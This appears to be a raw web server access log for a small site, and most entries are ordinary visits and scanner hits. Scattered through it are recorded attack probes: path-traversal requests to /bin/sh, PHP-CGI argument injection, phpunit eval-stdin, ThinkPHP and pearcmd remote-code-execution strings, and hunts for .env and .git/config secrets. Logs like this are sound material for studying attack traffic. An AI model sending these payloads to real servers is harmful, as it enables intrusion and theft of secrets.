::ffff:78.153.140.223 - - [18/Dec/2024:16:48:29 +0000] "GET /tool/view/phpinfo.view.php HTTP/1.1" 404 23 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; FunWebProducts; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; BRI/1; MAEM; .NET4.0C; FunWebProducts; BRI/2)"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:31 +0000] "GET /upload/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:21.0.0) Gecko/20121011 Firefox/21.0.0"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:31 +0000] "GET /vendor/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; pt-br) AppleWebKit/533.21.1 (KHTML, like Gecko) Version/5.0.5 Safari/533.21.1"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:33 +0000] "GET /web/.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.87 Safari/537.36"
::ffff:78.153.140.223 - - [18/Dec/2024:16:48:38 +0000] "GET /web/debug/default/view HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_3; fr-fr) AppleWebKit/531.22.7 (KHTML, like Gecko) Version/4.0.5 Safari/531.22.7"
::ffff:3.138.110.25 - - [18/Dec/2024:16:49:55 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::ffff:185.191.126.213 - - [18/Dec/2024:17:21:57 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:207.241.225.134 - - [18/Dec/2024:17:30:34 +0000] "GET / HTTP/1.1" 200 2179 "-" "Go-http-client/1.1"
::ffff:95.214.55.74 - - [18/Dec/2024:17:50:02 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:4.246.246.232 - - [18/Dec/2024:18:01:25 +0000] "GET /owa/auth/logon.aspx HTTP/1.1" 404 23 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:66.249.65.104 - - [18/Dec/2024:18:08:29 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.96 - - [18/Dec/2024:18:08:30 +0000] "GET /user_profile/132 HTTP/1.1" 302 34 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.139 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:66.249.65.96 - - [18/Dec/2024:18:08:30 +0000] "GET /blog HTTP/1.1" 200 73577 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.139 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
::ffff:95.214.55.43 - - [18/Dec/2024:18:14:54 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:87.120.115.119 - - [18/Dec/2024:18:20:48 +0000] "GET /.git/config HTTP/1.1" 200 283 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.80 Safari/537.36"
::ffff:64.23.201.216 - - [18/Dec/2024:18:25:49 +0000] "GET /admin/config.php HTTP/1.0" 404 23 "-" "nvdorz"
::ffff:80.94.93.191 - - [18/Dec/2024:18:27:00 +0000] "GET / HTTP/1.0" 200 2179 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::ffff:95.214.53.205 - - [18/Dec/2024:18:44:53 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:95.214.55.74 - - [18/Dec/2024:18:50:10 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:185.191.126.213 - - [18/Dec/2024:18:55:06 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:141.98.11.155 - - [18/Dec/2024:18:56:27 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:13.64.193.97 - - [18/Dec/2024:18:57:28 +0000] "GET /login HTTP/1.1" 404 23 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:46.19.138.234 - - [18/Dec/2024:19:05:36 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:95.214.55.74 - - [18/Dec/2024:19:41:38 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:95.214.55.79 - - [18/Dec/2024:19:56:33 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:93.174.93.12 - - [18/Dec/2024:20:01:24 +0000] "GET / HTTP/1.0" 200 2179 "-" "Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"
::ffff:185.191.126.213 - - [18/Dec/2024:20:04:13 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:95.214.55.74 - - [18/Dec/2024:20:37:26 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:87.120.115.34 - - [18/Dec/2024:20:40:52 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15"
::ffff:87.120.125.126 - - [18/Dec/2024:20:46:16 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Linux; Android 9; moto g(6)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
::ffff:95.214.53.205 - - [18/Dec/2024:21:00:56 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:185.191.126.213 - - [18/Dec/2024:21:29:54 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:92.249.48.38 - - [18/Dec/2024:21:36:27 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:182.253.40.4 - - [18/Dec/2024:21:36:59 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::ffff:165.227.45.30 - - [18/Dec/2024:21:42:24 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 Keydrop"
::ffff:95.214.55.74 - - [18/Dec/2024:21:46:21 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:185.117.225.70 - - [18/Dec/2024:22:03:00 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "python-requests/2.31.0"
::ffff:185.117.225.70 - - [18/Dec/2024:22:03:01 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (compatible; BitSightBot/1.0)"
::ffff:185.117.225.70 - - [18/Dec/2024:22:03:01 +0000] "GET /css/main.css HTTP/1.1" 200 459 "http://bro718.ru/" "Mozilla/5.0 (compatible; BitSightBot/1.0)"
::ffff:185.117.225.70 - - [18/Dec/2024:22:03:06 +0000] "GET /robots.txt HTTP/1.1" 404 23 "-" "python-requests/2.31.0"
::ffff:185.117.225.70 - - [18/Dec/2024:22:03:08 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (compatible; BitSightBot/1.0)"
::ffff:185.117.225.70 - - [18/Dec/2024:22:03:08 +0000] "GET /css/main.css HTTP/1.1" 200 459 "https://bro718.ru/" "Mozilla/5.0 (compatible; BitSightBot/1.0)"
::ffff:80.94.93.191 - - [18/Dec/2024:22:03:54 +0000] "GET / HTTP/1.0" 200 2179 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::ffff:95.214.53.205 - - [18/Dec/2024:22:15:05 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:95.214.53.91 - - [18/Dec/2024:22:19:50 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:95.214.55.74 - - [18/Dec/2024:22:20:19 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:199.127.63.64 - - [18/Dec/2024:22:31:29 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:95.214.55.74 - - [18/Dec/2024:22:40:38 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:94.156.248.28 - - [18/Dec/2024:22:41:34 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
::ffff:95.214.55.74 - - [18/Dec/2024:22:58:09 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:205.210.31.251 - - [18/Dec/2024:22:59:52 +0000] "GET / HTTP/1.0" 200 2179 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
::ffff:59.178.205.10 - - [18/Dec/2024:23:01:57 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
::ffff:154.213.187.122 - - [18/Dec/2024:23:06:34 +0000] "GET /login.rsp HTTP/1.1" 404 23 "-" "Hello World"
::ffff:209.38.206.136 - - [18/Dec/2024:23:24:55 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
::ffff:46.101.122.229 - - [18/Dec/2024:23:26:24 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0"
::ffff:64.23.201.216 - - [18/Dec/2024:23:27:19 +0000] "GET /admin/config.php HTTP/1.0" 404 23 "-" "xfa1"
::ffff:4.151.38.214 - - [18/Dec/2024:23:30:11 +0000] "GET /ReportServer HTTP/1.1" 404 23 "-" "Mozilla/5.0 zgrab/0.x"
::ffff:95.214.55.32 - - [18/Dec/2024:23:34:01 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 404 23 "-" "-"
::ffff:185.191.126.213 - - [18/Dec/2024:23:40:16 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:18.144.155.163 - - [18/Dec/2024:23:50:16 +0000] "GET / HTTP/1.1" 200 2179 "-" "bitdiscovery-suggestions"
::ffff:18.144.155.163 - - [18/Dec/2024:23:50:16 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:141.98.11.155 - - [18/Dec/2024:23:51:36 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:87.120.120.18 - - [19/Dec/2024:00:12:45 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"
::ffff:64.23.201.216 - - [19/Dec/2024:00:13:42 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 404 23 "-" "nvdorz"
::ffff:87.120.120.18 - - [19/Dec/2024:00:14:45 +0000] "GET /.env HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Linux; Android 9; SM-G955F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:27 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:27 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:28 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:28 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:28 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:28 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:28 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:29 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:29 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:29 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:29 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:30 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:32 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:32 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:32 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:32 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:33 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:33 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:33 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:34 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:34 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:35 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:35 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:35 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:35 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:35 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:36 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:36 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:36 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:37 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:37 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:37 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:37 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:38 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:38 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:39 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:39 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:39 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:39 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:40 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:40 +0000] "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:40 +0000] "GET /public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:40 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5("hi"));?>+/tmp/index1.php HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:40 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:8.222.172.249 - - [19/Dec/2024:00:22:41 +0000] "GET /containers/json HTTP/1.1" 404 23 "-" "Custom-AsyncHttpClient"
::ffff:216.218.206.67 - - [19/Dec/2024:00:43:34 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0.0 Safari/537.36"
::ffff:178.215.238.91 - admin [19/Dec/2024:00:43:53 +0000] "POST /apply.cgi HTTP/1.1" 404 23 "http://45.95.202.123:80/apply.cgi" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36"
::ffff:216.218.206.67 - - [19/Dec/2024:00:45:38 +0000] "GET /favicon.ico HTTP/1.1" 404 23 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
::ffff:216.218.206.67 - - [19/Dec/2024:00:46:23 +0000] "GET /geoserver/web/ HTTP/1.1" 404 23 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 YaBrowser/24.1.0.0 Safari/537.36"
::ffff:80.94.93.191 - - [19/Dec/2024:00:49:02 +0000] "GET / HTTP/1.0" 200 2179 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
::ffff:18.116.86.210 - - [19/Dec/2024:00:54:04 +0000] "GET / HTTP/1.1" 200 2179 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
::ffff:18.144.155.163 - - [19/Dec/2024:00:57:47 +0000] "GET / HTTP/1.1" 200 2179 "-" "bitdiscovery-suggestions"
::ffff:18.144.155.163 - - [19/Dec/2024:00:57:47 +0000] "GET / HTTP/1.1" 200 2179 "-" "-"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:44 +0000] "GET /dns-query?dns=dhMBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:45 +0000] "POST /dns-query HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:45 +0000] "GET /dns-query?name=example.com&type=A HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:46 +0000] "GET /dns-query?dns=Fa8BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:46 +0000] "POST /dns-query HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:46 +0000] "GET /dns-query?name=example.com&type=A HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:46 +0000] "GET /query?dns=M3MBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:47 +0000] "POST /query HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:47 +0000] "GET /query?name=example.com&type=A HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:47 +0000] "GET /query?dns=nYQBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:48 +0000] "POST /query HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:48 +0000] "GET /query?name=example.com&type=A HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:48 +0000] "GET /resolve?dns=bWsBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:48 +0000] "POST /resolve HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:49 +0000] "GET /resolve?name=example.com&type=A HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:49 +0000] "GET /resolve?dns=A8EBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:49 +0000] "POST /resolve HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:49 +0000] "GET /resolve?name=example.com&type=A HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:50 +0000] "GET /?dns=J2UBAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.1" 200 2179 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:50 +0000] "POST / HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:50 +0000] "GET /?name=example.com&type=A HTTP/1.1" 200 2179 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:51 +0000] "GET /?dns=Ck0BAAABAAAAAAAAB2V4YW1wbGUDY29tAAABAAE HTTP/1.1" 200 2179 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:51 +0000] "POST / HTTP/1.1" 404 23 "-" "Go-http-client/1.1"
::ffff:8.211.162.45 - - [19/Dec/2024:00:58:51 +0000] "GET /?name=example.com&type=A HTTP/1.1" 200 2179 "-" "Go-http-client/1.1"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:08 +0000] "GET /blog HTTP/1.1" 304 - "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /css/main.css HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_1883644583858357.jpeg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
::ffff:24.188.230.5 - - [19/Dec/2024:01:08:09 +0000] "GET /uploads/resized_5911340781465764.jpg HTTP/1.1" 304 - "https://bro718.ru/blog" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
